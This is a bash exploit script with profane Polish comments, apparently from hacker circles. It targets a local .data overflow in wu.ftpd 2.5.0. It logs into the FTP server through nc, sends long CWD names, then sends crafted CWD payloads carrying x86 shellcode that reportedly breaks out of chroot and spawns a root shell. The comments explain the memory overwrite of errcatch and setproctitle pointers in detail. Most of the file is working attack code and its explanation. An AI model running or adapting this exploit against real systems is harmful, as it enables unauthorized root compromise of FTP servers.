#!/bin/bash
# znalazlem 3 godzinki czasu wiec robie cos .. 
# lokal wu.ftpd a wlasciwie sam koncept ... (testowany na wu.ftpd-2.5.0)
#					    ( z -g i po wywaleniu -s )
#                                           ( build lnx; make install )
# kurewsko uroczy .data overflow :) rzadkosc nie ?
# na pozcatek pare cyferek
# /home/bulba/wuwu + 15 * 256  = 3856
# "ftpd: localhost: bulba: CWD " = 29

(
    NAZWA=`perl -e 'print "A" x 255'`
    MAXILE=15
    ILE=0

    echo user bulba
    echo pass dupa.zla.jak.cholera  # no co kurwa .. takie mam haslo w domciu :)
    echo cwd wuwu
    while [ $MAXILE -gt $ILE ]; do
        echo "cwd $NAZWA"
	let ILE=ILE+1
    done

# strategia:
# - wlazimy do katalogow tak zeby byc troche ponizej 4096b
# - robimy cwd ze spreparowana nazwa
#     - z lekka zamazuje nam sie onefile , Argv, LastArgv tak ze:
#		Argv wskazuje na onefile,
#		onefile wskazuje na pamiec troche przed errcatch
#		LastArgv wskazuja na pamiec kilka bajtow po errcatch+20
# - teraz automatisz robi sie setproctitle ... tylko ze nie z tym co trzeba
# - teraz robimy cwd z troche inaczej spreparowana nazwa
#	- setproctitle kopiuje nowa zawartosc pod stare adresy argv i lastargv
#	- adresy zmieniaja sie na nowe ...
# - znowu automatisz robi sie setproctitle ze zla zawartoscia... tym razem jusz 
#    pod nowy adres nam maze .. wiec nic nie popsuje ...
# - teraz wystarczy tylko wydac jakas nieistniejaca komende 
# - zroib sie longjmp(errcatch) ... a to wskazuje na nasz kod ...

# moje adresy:
# mapped_path 0x080af52c.. 0x080b052b
# onefile     0x080b052c   (8 bajtow .. 4 wykorzystujemy na nasz Argv[0] 
# drugi jako padding bo argv[1] jest nullowane)
# Argv, LastArgv ... dalej ..
# ... spreparowana scierzka od cwd jest pod mapped_path+3857
#      zakladamy ze pierwsze 4b z tej scierzki to wskaznik na dane po tym 
#      adresie (tam ma byc shellcode)
# errcatch = 0x080c8af0 .. + 20 - tutaj wstaiwamy adresik powrotu z longjmp
# zaczynamy zapisywac od  0x080c8ae4 .. bo najpierw jest 
# "ftpd: localhost: bulba: CWD " = 29 znakow a potem trzeba esp nalezytego dac 

# mamy dokladnie 235 bajtow miejsca na shellkoda ... zmiesci sie nie ? ;)
# moj sie zmiescil

# aha .. dziala na wszytkie VR, Bero
# heh .. to znaczy patrzac na source powinno dzialac 
# testowalem to wszystko na najnowszym blyszczacym wu.ftp-2.5.0
# w sumie jakby nazbierac zestawy adresow ze wszytkich kompilowanych/dystro 
# wu.ftpd to mozna zrobic kombajn .. bo inaczej nie ma sensu .. 

# read siedza zeby sobie debugiem oblookac ...
# jak komus sie wogole bedzie chcialo cokolwiek lookac, to radze 
# patrzec na: zestaw onefile .. LastArgv, i zestaw errcatch..errcatch+24
# naistotniejszy jest errcatch+20 bo tam jest adres pod ktory skoczy ftpd gdy 
# mu sie poda nieistniejaca komende a to powinno wskazywac na naszego szelkoda

# wpisywane magiczne kombinacje to kolejno (jakis fikcyjny esp jaki ma byc)
#   	          (mapped_path+3861) (nasz szelkod :)) (errcatch - 12chyba)
#                 4 spacje bo tu sie zamazuje (errcatch+26)

# teoria prawdopodobienstwa:
# musimy zgadnac 2 adresy: mapped_path i errcatch .... niestety ale z dokladnoscia 
# do 1 bajtu ..  kurewsko nie ?
# tylko ze te adresy sa powiazane ze soba .. w takich samych sourcach
# leza tak samo .. wiec teoretycznie tyko jeden adres .. i znac
# rozstaw w rozych dystrybucjach... ot co

# wogole .. co ja pierdole . .skoro to jest local to mozemy sobie 
# ( o ile secure nie ma) w procach po zalogowniu sie 
# na ftp podejrzec mapowanie segmentow .. i potem relatywnie do poczatku .. 
# u mnie byl 0x080ae000 poodejmujcie sobie

    read a
    perl -e 'print "cwd "; print "\x01\xfe\xff\xff\xbf\x45\x04\x0b\x08"; print "\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd\x80\x31\xc0\x31\xdb\x43\x89\xd9\x41\xb0\x3f\xcd\x80\xeb\x6b\x90\x90\x5e\x31\xc0\x31\xc9\x8d\x5e\x01\x88\x46\x04\x66\xb9\xff\x01\xb0\x27\xcd\x80\x31\xc0\x8d\x5e\x01\xb0\x3d\xcd\x80\x31\xc0\x31\xdb\x8d\x5e\x08\x89\x43\x02\x31\xc9\xfe\xc9\x31\xc0\x8d\x5e\x08\xb0\x0c\xcd\x80\xfe\xc9\x75\xf3\x31\xc0\x88\x46\x09\x8d\x5e\x08\xb0\x3d\xcd\x80\xfe\x0e\xb0\x30\xfe\xc8\x88\x46\x04\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xcd\x80\xe8\x90\xff\xff\xff\xff\xff\xff\x30\x62\x69\x6e\x30\x73\x68\x31\x2e\x2e\x31\x31\x42\x69\x42\x69"; print "A" x 79; print "\xe4\x8a\x0c\x08\x20\x20\x20\x20\x2c\x05\x0b\x08\x0b\x8b\x0c\x08"; print "\n"'
    read a

    # to samo tylko ze troche przesuniete tak zeby starej zawartosci nie zamazalo
    perl -e 'print "cwd "; print "\x01\xfe\xff\xff\xbf\x45\x04\x0b\x08"; print "\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd\x80\x31\xc0\x31\xdb\x43\x89\xd9\x41\xb0\x3f\xcd\x80\xeb\x6b\x90\x90\x5e\x31\xc0\x31\xc9\x8d\x5e\x01\x88\x46\x04\x66\xb9\xff\x01\xb0\x27\xcd\x80\x31\xc0\x8d\x5e\x01\xb0\x3d\xcd\x80\x31\xc0\x31\xdb\x8d\x5e\x08\x89\x43\x02\x31\xc9\xfe\xc9\x31\xc0\x8d\x5e\x08\xb0\x0c\xcd\x80\xfe\xc9\x75\xf3\x31\xc0\x88\x46\x09\x8d\x5e\x08\xb0\x3d\xcd\x80\xfe\x0e\xb0\x30\xfe\xc8\x88\x46\x04\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xcd\x80\xe8\x90\xff\xff\xff\xff\xff\xff\x30\x62\x69\x6e\x30\x73\x68\x31\x2e\x2e\x31\x31\x42\x69\x42\x69"; print "A" x 79; print "\xe4\x8a\x0c\x08\x20\x20\x20\x20\x2c\x05\x0b\x08\x01\x8b\x0c\x08"; print "\n"'
    echo "A ta komenda jest nielegalna"
    cat -
) | nc 0 21
    
# a jak kcecie rysunek to macie :
#  
# ------------------------------------------------------------------
# | mapped_path....        |aaaaSHELLKOD...    |1111|    |3333|4444|
# ------------------------------------------------------------------
#                               ^               | ^--------'    |
#                              |                |               |
# -----------------------------------           |               |
# |"ftpd: localhost: "    |esp |5555|...        |               |
# -----------------------------------           |               |
#  ^                              ^-------------+---------------'
#  `--------------------------------------------'
# fajny lamaniec co ?
# 
# 1111 = onefile    3333 = Argv  4444 = LastArgv   5555 = errcatch+20

# ze to wszytko dziala mozecie przekonac sie patrzac na transkrypcje
# teraz musicie mi wierzyc ze to dziala .. albo pojsc w moje slady
# i sprobowac tego co ja .. .wyjdzie wam . .zapewniam

# a wogole jak chcecie sie posmiac z idioty to:
# najpierw normalnie chcialem . .na stos poslac
# ale zapomnialem ze wyslana bedzie zla zawartosc ( z IDLE a nie CWD)
# potem chcialem gdzies indziej kopiowac .. jusz nie pamietam
# potem probowalem z atexit ... tylko ze ftpd wychodzi przez _exit .. porazka
# potem ogladalem sygnale .. 
# potem probowalem przez myoob (jak SIGURG dojdzie) ale dupa ...  bo za duzo zachodu
# potem jusz dobrze z errcatch . .tylko glupi dalem echo w skrypcie wiec
#                     error wyskakiwal co jedna linijke i myslalem ze porazka
# i na sam koniec jusz dobrze .. 
# nie ma to jak debile nie ?

# to tyle .. slonce mi swieci w monitor .. jest jusz prawie 8 rano
# nic nie widac .. przez te odblaski

# szelkod kopirajted baj Lam3rz .. uadniutki .. .
# z tego co pamietam to ten de-chrootuje sie .. i wogole .. 

# aaaa jakby ktos nie wiedzial
# jak ci sie obraz zjebie ^O ^V i masz znowu ludzkie literki

# a wogole dzisiejszy program byl sponsorowany przez:
# kurewskie projekty z jebanej geodezji
# literke � i cyfre 17 1/2
# bool glowy ... koszmarny bool glowy ... 
# zegarek marki SHARK dobrze pasujacy do kostki lewej nogi ...

